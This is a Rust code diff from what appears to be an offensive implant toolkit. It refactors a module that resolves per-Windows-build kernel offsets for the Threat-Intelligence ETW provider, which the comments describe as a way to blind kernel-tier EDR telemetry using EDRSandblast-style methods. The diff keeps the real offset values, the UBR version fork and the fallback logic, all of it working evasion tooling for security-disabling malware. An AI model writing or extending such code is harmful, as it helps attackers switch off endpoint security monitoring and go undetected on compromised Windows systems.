@@ -49,8 +49,9 @@
 //! 2. **Pattern scan (runtime, no network):** `pattern_scan` finds the
 //!    `EtwThreatIntProvRegHandle` global via RIP-relative `lea`/`mov`
 //!    references in ntoskrnl `.text` (see CheekyBlinder/EDRSandblast methods).
-//! 3. **`for_build` table (floor fallback):** the values below, keyed by build
-//!    number. Use ONLY when PDB + pattern scan are both unavailable. The
+//! 3. **`for_build` table (floor fallback):** the canonical cross-version
+//!    table in `evasionsdk::offsets_table` (single source of truth), keyed by
+//!    build number. Use ONLY when PDB + pattern scan are both unavailable. The
 //!    `for_build_strict` variant takes UBR for the 17763 LCU split.
 //!
 //! ## Why this works against kernel-tier EDR telemetry
@@ -79,8 +80,15 @@
 //! `for_build_strict` refines by UBR, and the PDB resolver (`offset-resolver`)
 //! gives the exact value. NEVER hardcode a single offset across builds — it
 //! silently writes the wrong field.
+//!
+//! **Source of the per-build values (w-offsets):** this module holds no
+//! offset table — [`EtwTiOffsets::for_build`] / [`EtwTiOffsets::for_build_strict`]
+//! source their values from `evasionsdk::offsets_table`, the canonical single
+//! source of truth (with the operator-side floor-match wrapper kept for
+//! builds the canonical table does not list explicitly).
 
 use crate::{EtwTiKit, KernelRw, KitError};
+use nyx_implant_evasionsdk::offsets_table as ev;
 
 /// The ETW-TI provider GUID (`Microsoft-Windows-Threat-Intelligence`).
 /// Used only for diagnostics / a future self-check that the resolved handle
@@ -111,9 +119,11 @@ pub struct EtwTiOffsets {
 
 impl EtwTiOffsets {
     /// Known-good offsets per Windows build + UBR (update build revision).
-    /// Sourced from EDRSandblast `NtoskrnlOffsets.csv` + fluxsec.red research.
-    /// Unknown builds return `None` so the caller MUST probe (writing a guessed
-    /// offset to the wrong field is a one-way ticket to a bugcheck).
+    /// Values are sourced from the canonical `evasionsdk::offsets_table` (the
+    /// single source of truth, w-offsets) — see [`Self::for_build`] for the
+    /// resolution order. Unknown builds return `None` so the caller MUST probe
+    /// (writing a guessed offset to the wrong field is a one-way ticket to a
+    /// bugcheck).
     ///
     /// **Critical version fork (ETW GUID entry was restructured in 17763.1075):**
     /// the `_ETW_GUID_ENTRY.ProviderEnableInfo` offset moved from `0x050`
@@ -122,47 +132,32 @@ impl EtwTiOffsets {
     /// `for_build` distinguishes via UBR when known; `for_build_strict` requires
     /// the caller to supply the exact UBR.
     pub fn for_build(build: u32) -> Option<Self> {
-        match build {
-            // Win10 1809–22H2 / Server 2019 (build 17763 .. 19045). The range
-            // ends at 19045 (22H2, an enablement package over 19041) to match
-            // the implant-side evasionsdk table policy — 19045 is an EXPLICIT
-            // row there, not a floor-match. For 17763 specifically, assume
-            // patched (UBR>=1075) — virtually every live Server 2019 is. RTM
-            // (UBR=1) callers should use for_build_strict.
-            17763 => Some(Self::patched_17763()),
-            18362..=19045 => Some(Self {
-                guid_entry_to_provider_block: 0x020,
-                provider_block_to_enable_info: 0x060,
-                is_enabled_within_enable_info: 0x000,
-            }),
-            // Server 2022 / Win11 21H2 (20348/22000): same ETW layout as 1904x.
-            20348..=22000 => Some(Self {
-                guid_entry_to_provider_block: 0x020,
-                provider_block_to_enable_info: 0x060,
-                is_enabled_within_enable_info: 0x000,
-            }),
-            // Win11 22H2/23H2 (22621/22631): EnableInfo shifted to 0x070.
-            22621..=22631 => Some(Self {
-                guid_entry_to_provider_block: 0x020,
-                provider_block_to_enable_info: 0x070,
-                is_enabled_within_enable_info: 0x000,
-            }),
-            // Win11 24H2/25H2 (26100/26200): same as 22H2 ETW layout.
-            26100..=26200 => Some(Self {
-                guid_entry_to_provider_block: 0x020,
-                provider_block_to_enable_info: 0x070,
-                is_enabled_within_enable_info: 0x000,
-            }),
-            // Floor match: a build outside every explicit range (e.g. 22635)
-            // maps to the nearest lower range's layout.
-            _ => Self::floor_match(build),
+        // Single source of truth: the canonical cross-version table in
+        // `evasionsdk::offsets_table`. Exact rows AND patch-equivalent builds
+        // (e.g. 19045 → 19041, 22000 → 20348) resolve through `ev::for_build`.
+        // Builds the canonical table does not know fall through to
+        // [`Self::floor_match`] below — the historical operator-side floor
+        // behavior, now sourced from the same canonical rows (no duplicated
+        // offset literals in this module).
+        if let Some(canon) = ev::for_build(build) {
+            return Some(Self::from_canonical(canon.etw_ti));
+        }
+        Self::floor_match(build)
+    }
+
+    /// Copy the 3 chase-hop offsets from the canonical table row.
+    fn from_canonical(etw: ev::EtwTiOffsets) -> Self {
+        Self {
+            guid_entry_to_provider_block: etw.guid_entry_to_provider_block,
+            provider_block_to_enable_info: etw.provider_block_to_enable_info,
+            is_enabled_within_enable_info: etw.is_enabled_within_enable_info,
         }
     }
 
-    /// Floor match: the highest known range ceiling <= the requested one.
-    /// Handles builds outside every explicit range (e.g. 22635 → the
-    /// 22H2/23H2 layout, 22001 → Server 2022's). 19045 is NOT handled here
-    /// anymore — it is an explicit range entry, aligned with evasionsdk.
+    /// Floor match: the highest canonical row <= the requested one. Handles
+    /// builds outside every explicit canonical row (e.g. 22635 → the
+    /// 22H2/23H2 layout, 22001 → Server 2022's). Values come from the
+    /// canonical table via [`Self::for_build`].
     ///
     /// Returns `None` ABOVE the last verified build (26200): the Win11 24H2+
     /// `0x070` EnableInfo offset is "possibly correct, pending PDB verification"
@@ -170,7 +165,7 @@ impl EtwTiOffsets {
     /// violates the module's own "Unknown builds return None so the caller MUST
     /// probe" contract (kernelsdk-2-5).
     fn floor_match(build: u32) -> Option<Self> {
-        // Try each known range ceiling; return the one whose range floor <= build.
+        // Try each known canonical row; return the one whose row <= build.
         if build > 26200 {
             None // above the last verified build — caller MUST probe (kernelsdk-2-5)
         } else if build >= 26100 {
@@ -194,24 +189,14 @@ impl EtwTiOffsets {
     pub fn for_build_strict(build: u32, ubr: u32) -> Option<Self> {
         match build {
             17763 => {
-                // RTM (UBR < 1075) uses 0x050; 1075+ uses 0x060.
-                let enable_info = if ubr < 1075 { 0x050 } else { 0x060 };
-                Some(Self {
-                    guid_entry_to_provider_block: 0x020,
-                    provider_block_to_enable_info: enable_info,
-                    is_enabled_within_enable_info: 0x000,
-                })
+                // RTM (UBR < 1075) uses 0x050; 1075+ uses 0x060. The UBR fork
+                // is canonical knowledge too — sourced from
+                // `evasionsdk::offsets_table::for_build_strict`.
+                ev::for_build_strict(build, ubr).map(Self::from_canonical)
             }
+            // Non-17763 builds have no UBR fork — the plain table path
+            // (canonical row + operator-side floor match) applies.
             _ => Self::for_build(build),
-        }
-    }
-
-    /// The patched-17763 layout (EnableInfo @ 0x060). Most common live value.
-    fn patched_17763() -> Self {
-        Self {
-            guid_entry_to_provider_block: 0x020,
-            provider_block_to_enable_info: 0x060,
-            is_enabled_within_enable_info: 0x000,
         }
     }
 }
